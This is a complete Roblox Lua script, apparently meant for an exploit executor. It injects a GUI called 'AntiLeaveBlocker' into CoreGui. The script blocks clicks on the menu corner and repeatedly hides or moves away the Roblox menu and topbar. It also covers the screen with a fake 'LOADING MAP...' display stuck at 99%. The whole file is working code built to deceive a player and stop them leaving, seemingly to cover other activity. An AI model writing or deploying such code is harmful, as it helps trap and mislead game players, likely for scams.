pcall(function()
	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
		game.CoreGui.AntiLeaveBlocker:Destroy()
	end
end)


local BLOCK_SIZE_X = 56
local BLOCK_SIZE_Y = 56
local BLOCK_POS_X  = 6
local BLOCK_POS_Y  = 6
local DISPLAY_ORDER = 10000


local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local TextService = game:GetService("TextService")


local function tryHideRobloxMenu()
	pcall(function()
		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
		for _, n in ipairs(names) do
			local g = CoreGui:FindFirstChild(n)
			if g then
				pcall(function()
					if g:IsA("ScreenGui") then
						g.Enabled = false
						for _, c in ipairs(g:GetChildren()) do
							pcall(function() c.Visible = false end)
							pcall(function() c.Enabled = false end)
						end
					else
						for _, c in ipairs(g:GetDescendants()) do
							pcall(function()
								if c:IsA("GuiObject") then
									c.Position = UDim2.new(-10,0,-10,0)
								end
							end)
						end
					end
				end)
			end
		end
	end)
end


local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLeaveBlocker"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = DISPLAY_ORDER
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Original blocker container
local container = Instance.new("Frame")
container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.Parent = screenGui

local blocker = Instance.new("TextButton")
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.AutoButtonColor = false
blocker.Text = ""
blocker.Parent = container
blocker.Active = true
blocker.Selectable = false

blocker.MouseButton1Down:Connect(function() end)
blocker.MouseButton1Up:Connect(function() end)
blocker.MouseButton2Down:Connect(function() end)
blocker.MouseButton2Up:Connect(function() end)


-- ADDITION: Loading screen visual matching the image
local loadingScreen = Instance.new("Frame")
loadingScreen.Size = UDim2.new(1, 0, 1, 0)
loadingScreen.Position = UDim2.new(0, 0, 0, 0)
loadingScreen.BackgroundColor3 = Color3.new(0, 0, 0)
loadingScreen.BackgroundTransparency = 0.5 -- Semi-transparent background
loadingScreen.Parent = screenGui

-- "LOADING MAP..." text
local loadingMapText = Instance.new("TextLabel")
loadingMapText.Text = "LOADING MAP..."
loadingMapText.Size = UDim2.new(1, 0, 0, 50)
loadingMapText.Position = UDim2.new(0, 0, 0.1, 0)
loadingMapText.BackgroundTransparency = 1
loadingMapText.TextColor3 = Color3.new(1, 1, 1)
loadingMapText.TextScaled = true
loadingMapText.Font = Enum.Font.RobotoBold
loadingMapText.Parent = loadingScreen

-- Loading bar container
local loadingBarContainer = Instance.new("Frame")
loadingBarContainer.Size = UDim2.new(0.8, 0, 0, 40)
loadingBarContainer.Position = UDim2.new(0.1, 0, 0.4, 0)
loadingBarContainer.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
loadingBarContainer.BorderSizePixel = 0
loadingBarContainer.Parent = loadingScreen

-- "LOADING" label above bar
local loadingLabel = Instance.new("TextLabel")
loadingLabel.Text = "LOADING"
loadingLabel.Size = UDim2.new(1, 0, 0, 20)
loadingLabel.Position = UDim2.new(0, 0, -0.6, 0)
loadingLabel.BackgroundTransparency = 1
loadingLabel.TextColor3 = Color3.new(1, 1, 1)
loadingLabel.Font = Enum.Font.RobotoMedium
loadingLabel.TextSize = 18
loadingLabel.Parent = loadingBarContainer

-- Progress bar fill (stuck at 99%)
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0.99, 0, 0.6, 0)
progressBar.Position = UDim2.new(0.005, 0, 0.2, 0)
progressBar.BackgroundColor3 = Color3.new(0, 0.5, 1) -- Blue fill
progressBar.BorderSizePixel = 0
progressBar.Parent = loadingBarContainer

-- "99%" text
local progressText = Instance.new("TextLabel")
progressText.Text = "99%"
progressText.Size = UDim2.new(0, 50, 0, 20)
progressText.Position = UDim2.new(0, 10, 0.2, 0)
progressText.BackgroundTransparency = 1
progressText.TextColor3 = Color3.new(1, 1, 1)
progressText.Font = Enum.Font.RobotoMedium
progressText.TextSize = 16
progressText.Parent = loadingBarContainer

-- "Finalizing..." subtext
local finalizingText = Instance.new("TextLabel")
finalizingText.Text = "Finalizing..."
finalizingText.Size = UDim2.new(1, 0, 0, 16)
finalizingText.Position = UDim2.new(0, 10, 1.1, 0)
finalizingText.BackgroundTransparency = 1
finalizingText.TextColor3 = Color3.new(0.8, 0.8, 0.8)
finalizingText.Font = Enum.Font.Roboto
finalizingText.TextSize = 14
finalizingText.Parent = loadingBarContainer


-- Original update loop
RunService.RenderStepped:Connect(function()
	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
end)


spawn(function()
	while screenGui.Parent and screenGui.Parent == CoreGui do
		tryHideRobloxMenu()
		wait(2)
	end
end)
